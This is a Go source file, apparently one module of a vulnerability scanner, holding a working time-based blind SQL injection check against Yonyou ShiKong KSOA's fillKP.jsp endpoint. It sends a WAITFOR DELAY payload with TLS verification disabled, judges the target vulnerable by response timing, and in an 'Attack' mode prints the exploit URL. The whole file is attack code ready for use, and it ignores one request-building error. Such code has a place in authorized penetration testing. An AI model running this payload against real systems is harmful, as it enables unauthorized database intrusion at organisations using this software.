package CVEs

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

func YongYouShiKongKSOA_SQLInjection2(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/kp/fillKP.jsp?kp_djbh=1%%27+IF(LEN(db_name())>4)+WAITFOR%%20DELAY%%20%%270:0:2%%27+--+", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	// 记录请求开始时间
	startTime := time.Now()

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	// 记录请求结束时间
	endTime := time.Now()

	// 计算请求时长
	duration := endTime.Sub(startTime)

	if 2*time.Second <= duration && duration <= 6*time.Second {
		fmt.Println("[*]用友时空KSOA SQL注入漏洞2 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/kp/fillKP.jsp?kp_djbh=1%%27+IF(LEN(db_name())>4)+WAITFOR%%20DELAY%%20%%270:0:2%%27+--+\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
